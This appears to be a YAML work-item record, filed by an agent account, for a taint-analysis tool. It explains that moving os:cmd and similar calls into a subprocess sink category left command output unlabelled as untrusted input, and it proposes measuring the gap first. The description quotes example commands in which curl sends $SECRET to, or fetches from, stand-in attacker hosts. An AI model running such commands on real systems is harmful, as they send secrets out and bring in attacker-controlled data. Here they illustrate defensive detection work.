@@ -1,0 +1,22 @@
+- op: create  # 2166
+  at: '2026-08-13T09:49:00Z'  # 2166
+  by: agent  # 2166
+  actor: jgstern_agent  # 2166
+  clock: 1  # 2166
+  nonce: '2166'  # 2166
+  data:  # 2166
+    kind: work_item  # 2166
+    title: "A subprocess primitive that RETURNS the child's output is also an untrusted_input source, and the WI-jupaf re-key left that half unlabelled"  # 2166
+    status: todo_hard  # 2166
+    priority: 2  # 2166
+    parent:  # 2166
+    tags:  # 2166
+    - io_boundary  # 2166
+    - taint  # 2166
+    - catalog  # 2166
+    isbefore: []  # 2166
+    duplicate_of: []  # 2166
+    not_duplicate_of: []  # 2166
+    pr_ref:  # 2166
+    description: "Created by the WI-jupaf re-key, and named there rather than left to be\ndiscovered.\n\nWI-jupaf moved `os:cmd/1` (and `erlang:open_port/2`) out of erlang.yaml's\nenv_read + env_write lists and into a new `subprocess:` section. That was the\nright call for the LAUNCH -- it closed a measured false confirm, where\n`os:cmd(\"curl -d $SECRET https://evil.example\")` answered\n`{boundary: subprocess, must_not_exist: true}` with confirmed rc 0.\n\nBut io_primitives auto-derives taint entries by boundary (WI-lokuv), so the\nre-key also changed the primitive's ROLE:\n\n    BEFORE   os.cmd = env_read   -> auto-derived SOURCE, label host_secret\n    AFTER    os.cmd = subprocess -> auto-derived SINK,   zone subprocess\n\nVerified against the merged taint catalogue for both BEAM languages (elixir\ninherits erlang):\n\n    erlang:  SINK module='os'     name='cmd'       zone='subprocess'\n             SINK module='erlang' name='open_port' zone='subprocess'\n    elixir:  same, plus its own System.cmd\n\nTHE SINK IS CORRECT AND THE OLD SOURCE WAS WRONG. `env_read` maps to\nhost_secret, so the tool was labelling the STDOUT OF AN ARBITRARY COMMAND as a\nhost secret -- `os:cmd(\"ls\")` minted a secret. Removing that removes false\nfindings, so the re-key's direction is right and this item is NOT a request to\nrevert it.\n\nWHAT IS NOW MISSING, and it is a genuine recall gap the re-key created:\nthe output of a launched program is UNTRUSTED INPUT, and nothing labels it as\nsuch. `Data = os:cmd(\"curl https://attacker.example\")` returns attacker-\ncontrolled bytes and no taint source fires on it, so a claim of the form\n`untrusted_input must not reach <zone>` cannot see a flow seeded there.\n\nThis is a general shape rather than a BEAM one: any subprocess primitive that\nRETURNS the child's output is simultaneously a launch sink and an untrusted-\ninput source. Candidates visible in the shipped catalogues, unmeasured:\npython `subprocess.check_output` / `run` (captures stdout), go\n`os/exec.Cmd.Output` / `CombinedOutput`, ruby backticks, elixir `System.cmd`\n(returns {output, status}), erlang `os:cmd`. Note the ones that do NOT qualify\n-- `subprocess.call`, `System.halt`, the wait/signal family -- which is why\nthis needs a per-row decision and not a blanket rule over the subprocess\nboundary.\n\nNOT MEASURED, and that gates the work: whether any repo in the corpus actually\nseeds a flow from command output today, i.e. whether adding the source label\nwould produce findings or only a ceiling. Do that first -- it is the same\ndistinction WI-jupaf itself was filed with, and the reason WI-jupaf turned out\nto be worth doing was that the emission shape measured GOOD before any row was\nwritten.\n\nA SECOND QUESTION TO SETTLE WITH IT: whether one primitive may be both a taint\nSOURCE and a taint SINK at once. The auto-derivation currently picks one by\nboundary, so this may need the same \"simultaneously true\" treatment INV-zumin\nneeds on the boundary side -- and if so the two should be designed together\nrather than growing two mechanisms for one shape."  # 2166
+    fields: {}  # 2166
